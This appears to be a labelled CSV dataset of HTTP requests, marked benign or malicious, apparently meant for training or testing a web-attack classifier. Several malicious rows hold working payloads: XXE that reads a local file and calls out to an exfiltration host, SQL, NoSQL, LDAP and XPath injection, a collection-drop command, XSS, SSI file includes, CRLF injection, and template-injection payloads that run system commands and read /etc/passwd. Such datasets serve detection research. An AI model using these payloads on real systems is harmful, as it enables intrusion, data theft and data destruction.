label,text
benign,"GET /api/v1/user/profile?details=full HTTP/1.1
Host: secure-user-portal.net
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Q3aC43B7W0LfajH6Ip9ErlzoGZ_4K9_WL1c3zsEE-2g
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
X-Requested-With: XMLHttpRequest"
benign,"GET /dashboard/monitoring/data?token=Io9yHTAjZvlBI67MrGpXVbYhUO3QcxCseKrNJtfS20RmP4LzqFwDn85EDuWa1gkV HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.88.1
Accept: */*
DNT: 1
Connection: keep-alive"
benign,"GET /public/js/utils.min.js HTTP/1.1
Host: local-web-applications.com
Accept: application/javascript, */*;q=0.8
User-Agent: Go-http-client/1.1
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /newsletter/subscribe HTTP/1.1
Host: daily-updates.my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Language: en-US
Content-Length: 29
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.173 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

email=patrick.hawkins%40email.org&ref=footer"
benign,"POST /v2/notifications/push/send HTTP/1.1
Host: mobile-alert-service.pushnotifyapp.com
Authorization: Bearer f67a133b-fecb-4baf-9678-0af5a377d6e1
Content-Type: application/json
Content-Length: 104
X-Request-ID: a8dc9f2e-7a6a-4882-854a-3a18c568fee7
Idempotency-Key: 9e4b468e-4f14-4b3a-9a17-0c4c7ca4ec23
X-Client-Version: 7.1.0
Accept: application/json
Accept-Language: en-US
Connection: keep-alive
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G996U Build/RP1A.200720.012)

{""deviceToken"":""e43f9d6c41253f069ee7fbabae6742a6"",""message"":""Your weekly report is ready."",""priority"":""normal""}"
benign,"OPTIONS /api/v1/user/profile HTTP/1.1
Host: data-streamer.cloud-services.ai
Origin: https://app.frontend-portal.io
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization, X-Requested-With
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /user/password/request HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/json
Content-Type: application/json
Cache-Control: no-cache
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Content-Length: 51

{""email"":""sophia.chan@my-personal-blog-site.info""}"
benign,"POST /submit/login HTTP/1.1
Host: auth.secure-portal-center.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://auth.secure-portal-center.net/login
Connection: keep-alive

username=james.mitchell&password=P%40ssw0rd123&callback=%2Fuser%2Fdashboard"
benign,"POST /log/session HTTP/1.1
Host: sync-analytics.cloud-web.ai
Origin: https://portal.sync-analytics.cloud-web.ai
Content-Type: text/plain
Content-Length: 50
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: close

{""eventType"":""session_start"",""timestamp"":""2024-06-01T12:34:56Z""}"
benign,"GET /profile/view?session_id=def456user&utm_medium=newsletter HTTP/1.1
Host: client-dashboard-portal.co
Accept: text/html
Accept-Encoding: gzip, deflate
Referer: https://client-dashboard-portal.co/login
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /assets/css/theme-dark.min.css HTTP/1.1
Host: urban-crafts-marketplace.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/css,*/*;q=0.1
Referer: https://urban-crafts-marketplace.co/shop/new-arrivals
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
malicious,"POST /config/apply HTTP/1.1
Host: settings-management.app-configurator.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/xml
Accept: application/xml, text/html, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 270

<!DOCTYPE config [
<!ENTITY % file SYSTEM ""file:///etc/issue.net"">
<!ENTITY % dtd SYSTEM ""http://config-exfiltrator.app-secure.net/exfil.dtd"">
%dtd;
%send;
]>
<config>
  <version>1.2.3</version>
</config>"
benign,"GET /resource/load?file=docs/changelog_2024_06.md HTTP/1.1
Host: tech-startup-innovations.ai
Accept: text/markdown,text/plain;q=0.9,*/*;q=0.8
User-Agent: python-requests/2.31.0
Connection: keep-alive
Accept-Encoding: gzip, deflate, br"
benign,"POST /user/account/update HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--Xy7d9pzq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Length: 228
Cookie: session_token=d0427a80c1f6e934aaf56d22e31bc8ea; logged_in=true

----Xy7d9pzq
Content-Disposition: form-data; name=""firstName""

Emma
----Xy7d9pzq
Content-Disposition: form-data; name=""lastName""

Rodriguez
----Xy7d9pzq
Content-Disposition: form-data; name=""email""

emma.rodriguez@secure-user-portal.net
----Xy7d9pzq
Content-Disposition: form-data; name=""newsletter""

yes
----Xy7d9pzq--"
malicious,"POST /users/edit-profile HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.6
Cookie: forum_session=48fdb91eadc35f8dcd91

display_name=CrazyGamer&user_bio=<!--#Include   ViRtUaL='/var/www/html/includes/secret.key' -->"
benign,"GET /api/v1/users/notifications HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive"
benign,"GET /categories/women/shoes HTTP/1.1
Host: elegant-style-forum.org
Connection: close
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://elegant-style-forum.org/home
Cookie: session_id=98765ghj45kl23mn; cart_token=token_5467wnepl
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36"
malicious,"GET /resource/file:///C:/Windows/System32/drivers/etc/hosts HTTP/1.1
Host: docs-intranet-secure.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9
Cache-Control: no-cache"
malicious,"OPTIONS /services/report HTTP/1.1
Host: reports.web-dashboard-solutions.co.uk
User-Agent: curl/7.68.0 <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Accept: */*
X-Requested-With: XMLHttpRequest
Origin: https://securelogin.enterpriseauth.biz"
malicious,"GET /members/<iMg sRc=x onErRoR=alert(document.cookie)>/dashboard HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive"
benign,"GET /icons/ui/loading-animation.gif HTTP/1.1
Host: urban-photo-gallery.net
Accept: image/gif,image/*;q=0.7,*/*;q=0.3
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://urban-photo-gallery.net/gallery/trending
Connection: keep-alive"
benign,"POST /photos/new_upload HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.1
Accept: */*
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=----WebBoundaryMyBlog001
Referer: https://my-personal-blog-site.info/new-post
Cookie: blog_user=abc123xyz789;
Connection: close

------WebBoundaryMyBlog001
Content-Disposition: form-data; name=""image_file""; filename=""blogphoto.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebBoundaryMyBlog001
Content-Disposition: form-data; name=""caption""

Hiking the Rockies
------WebBoundaryMyBlog001--"
benign,"GET /assets/images/backgrounds/hero-banner.avif HTTP/1.1
Host: cozybook-cafe.jp
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Accept-Language: ja-JP,en-US;q=0.8,en;q=0.6
Connection: keep-alive
Referer: https://cozybook-cafe.jp/homepage
Cache-Control: no-cache"
benign,"POST /register/event-signup HTTP/1.1
Host: active-lifestyle-club.co.uk
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://active-lifestyle-club.co.uk/events

events[]=yoga&events[]=cycling&receive_updates=on"
benign,"GET /news/today HTTP/1.1
Host: worldwire-feed.net
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
X-Forwarded-For: 172.16.254.1
Cache-Control: max-age=0
Connection: close"
benign,"GET /api/v1/games/leaderboard/top HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://community.game-dev-forum.org
Authorization: Bearer def789abc123xyz456
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache"
malicious,"POST /api/session/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 107
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
X-CSRF-Token: 6e5d4c3b-2a19-8f7e-6d5c-4b3a29108f7e

{""username"":""writer88"",""password"":""writerpass' Or 'x'='X' -- ""}"
malicious,"GET /portal/index?welcome=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: dev-ops-toolkit.cloud
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /images/logo.svg HTTP/1.1
Host: vibrant-branding-solutions.io
Connection: keep-alive
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Referer: https://vibrant-branding-solutions.io/home
Accept-Language: en-US,en;q=0.9"
malicious,"POST /app/user/settings HTTP/1.1
Host: data-sync-service.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cache-Control: max-age=0
Origin: https://data-sync-service.cloud-data-services.ai
Cookie: session=ZXhhbXBsZXNlc3Npb25pZC0xMjM0NTY3OA==
Content-Length: 50

theme=light&user_pref=notifications_enabled'; db.sessions.drop(); //"
malicious,"GET /search/user?login=%2A%29%28uid%3D%2A%29%29%28%7C%28email%3D*%29 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/login
Connection: keep-alive"
malicious,"POST /api/v4/redirect HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.8
Content-Type: application/json
Content-Length: 275
Origin: https://online-retail-store.biz
Cookie: sessionid=xyz789token456abc

{""redirect_url"": ""/checkout%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://redirect-hack.online-retail-store.biz%0d%0a%0d%0a<html><body>Redirecting you now...</body></html>""}"
benign,"POST /files/multi-upload HTTP/1.1
Host: educational-resources.org
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Type: multipart/form-data; boundary=EduMultiPart007
Content-Length: 1794
Referer: https://educational-resources.org/upload
Connection: keep-alive
Cookie: edures_usersession=ed987fsdf2323

--EduMultiPart007
Content-Disposition: form-data; name=""resources[]""; filename=""math_homework.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

(binary data docx)
--EduMultiPart007
Content-Disposition: form-data; name=""resources[]""; filename=""history_notes.pdf""
Content-Type: application/pdf

(binary data pdf)
--EduMultiPart007
Content-Disposition: form-data; name=""resources[]""; filename=""science_diagram.png""
Content-Type: image/png

(binary data png)
--EduMultiPart007--"
benign,"POST /api/v1/user/profile/update HTTP/1.1
Host: identity-hub-cloud.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcd1234efgh5678ijkl9012mnop3456qrst7890
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 123
Connection: keep-alive

{""user.profile-settings"": {""theme-color"": ""dark"", ""notifications_enabled"": true}, ""data[version]"": ""1.0.3"", ""session-token"": ""zYxWvUtSrQp123456""}"
malicious,"GET /query_documents?title=Advanced%20XPath%20Techniques%27%20or%20%271%27%3D%271 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Cache-Control: no-cache"
benign,"GET /api/v2/customers/list HTTP/1.1
Host: data-services-secure.net
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer mF_9.B5f-4.1JqM
Connection: keep-alive
Accept-Language: en-US,en;q=0.9"
benign,"GET /api/search/resources?query=machine%20learning&published_after=2023-01-01&sort=relevance HTTP/1.1
Host: knowledge-resources-library.site
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /search/items HTTP/1.1
Host: data-insights-platform.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) <script>alert('LogViewerXSS')</script>
Accept: */*
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0"
malicious,"POST /api/upload/profile HTTP/1.1
Host: user-avatar-upload.net
Content-Type: application/json
Accept: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Length: 357

{""user"":{ ""id"":15342, ""avatar_url"":""https://cdn.user-avatar-upload.net/images/u12345.png"", ""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('head -n 3 /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}}"
benign,"POST /upload/user/photo HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://online-retail-store.biz/account/settings
Origin: https://online-retail-store.biz
Cookie: id_token=eyJraWQiOiJzZXJ2ZXJfa2V5IiwieDV0IjoiQ2U3ZzhSJfoiLCJhbGciOiJIUzI1NiJ9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycJUpwFg1Oy9DlZEt
Content-Length: 475
Connection: keep-alive

------WebKitFormBoundarycJUpwFg1Oy9DlZEt
Content-Disposition: form-data; name=""album_id""

profile_pics
------WebKitFormBoundarycJUpwFg1Oy9DlZEt
Content-Disposition: form-data; name=""caption""

New work profile photo
------WebKitFormBoundarycJUpwFg1Oy9DlZEt
Content-Disposition: form-data; name=""image_file""; filename=""work_photo.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitFormBoundarycJUpwFg1Oy9DlZEt--"
benign,"GET /feed/atom.xml HTTP/1.1
Host: vintage-book-collectors.club
Accept: application/atom+xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Referer: https://vintage-book-collectors.club/collections
Connection: close
Accept-Language: en-us,en;q=0.5"
malicious,"GET /account HTTP/1.1
Host: enterprise-collab-suite.co
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
X-Forwarded-Host: enterprise-collab-suite.co{#{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}#}
Accept-Language: en-US,en;q=0.5"
benign,"GET /favicon.ico HTTP/1.1
Host: smart-home-dashboard.net
Connection: keep-alive
Accept: image/vnd.microsoft.icon,image/x-icon,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Mobile Safari/537.36
X-Requested-With: com.smart.home.dashboard"
benign,"GET /forum/topics/5678/page/4 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
If-Modified-Since: Sun, 19 Mar 2023 22:27:00 GMT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/forum/topics/5678/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
benign,"GET /api/v1/vehicles/search?make=tesla&year=2023 HTTP/1.1
Host: smart-drive-platforms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Referer: https://eco-life-blogspace.org/post/leading-electric-cars-2024
DNT: 1
Connection: keep-alive"
malicious,"GET /data/report HTTP/1.1
Host: analytics.deep-insight.co.uk
X-Forwarded-For: 203.0.113.55%0d%0aX-Injected-Flag:%20bypass
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: search-content.my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: session_filter=(uid=editor%00
Content-Length: 21

query=latest+posts"
